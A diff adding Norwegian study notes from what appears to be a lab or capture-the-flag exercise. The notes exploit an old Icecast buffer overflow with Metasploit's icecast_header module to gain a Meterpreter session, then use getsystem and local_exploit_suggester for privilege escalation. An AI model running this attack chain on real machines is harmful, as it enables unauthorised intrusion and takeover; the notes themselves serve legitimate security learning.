@@ -31,3 +31,40 @@ Med andre ord var det kanskje bare ikke mulig aa finne ut noyaktig hvilken versj
 Uansett jeg fant 2004 icecast vulnerabilitien paa nettsiden og den hadde hoy score. Denne vulnerabilitien var av typen "Execute CodeOverflow":
 Sitat fra www.cvedetails.com: "Buffer overflow in Icecast 2.0.1 and earlier allows remote attackers to execute arbitrary code via HTTP request with a large number of headers" 
 
+Gikk deretter over til Metasploit og sookte paa icecast, da fikk jeg opp kunn ett resultat:
+search icecast	#Hensikten min her var aa finne diverse moduler for aa teste opp mot utsatt maskin.
+		#var kunn ett resultat, faktisk 2004 exploiten saa jeg hviste det var den rette
+
+Brukte modulen til aa faa meterpreter ookt med utsatt maskin:
+use exploit/windows/http/icecast_header	#Bruker modulen
+show options				#Ser hva som er mulig med modulen, spesifikt hvilke variabler som er nodvendig 
+setg rhost 10.10.169.236		#Setter globale variabel paa utsatt maskin
+run					#Kjoorer modulen
+					#Naa har jeg meterpreter ookt med utsatt pc
+
+Noen greie kommandoer for aa faa godt inntrykk av maskinen naar du har faatt meterpreter shell:
+getuid		#Hvilken bruker kjoorer programmet jeg har exploita
+sysinfo		#Faar informasjon om den utsatte/remote maskinen som OS
+getpid		#Faa process ID som du er i, for etterpa kan du se paa hvilke andre prosesser som kjoorer ved ps
+ps		#prosess/prosess list/processes	viser alle prosesser med nyttig format som ID, navn osv. 
+getsystem	#Prover aa eskalere rettighetene dine tilsvarende til lokale systemet
+
+Naa er vi i post stadiet og kan benytte oss av local exploit suggester, lester
+#For aa kunne bruke lester maa vi ha en session paa utsatt maskin. Det er viktig aa notere seg hva slags type ookt en har siden det kan paavirke hvilke vulnerabilities som
+#blir detected. Hvis vi bruker windows er vi anbefalt aa bruke meterpreter, for alle andre OS anbefaler en shell ookt. Inntil videre antar jeg dette gjelder for det utsatte
+#Altsaa meterpreter for windows maskiner vi har penetrert
+
+Naar vi har aapnet en session med utsatt pc er det et par ekstra tiltak som kan hjelpe med forstaelsen, dette gjores i metasploit og ikke meterpreter tror jeg:
+set verbose true		#Be maskinen si hva den gjor
+set exitonsession false		#ikke bryt kobling??
+
+Naa kan vi bruke lester til aa gjore grovarbeidet for oss:
+run post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true	#SHOWDESCRITPION er viktig for aa vise description paa de ulike exploitene som kommer opp
+#vi husker ikke hva ms17_010 gjoor for eksemepl. Greit aa vite at det er tre ulike tilstander som blir beskrevet av lester
+			#Vulnerable: The check was able to use a bug or obtain hard evidence of its existence
+			#Appears: When the target has the vulnerable resource available
+			#Detected: When the target has a vulnerable service running but the check is unable to complete
+
+#Men det er viktig aa huske at det kan ogsaa vaere tilfelle at exploiten ikke ble sjekket i det hele tatt. Dette hender nar exploiter som trenger en option/variabel som ikke er satt
+
+
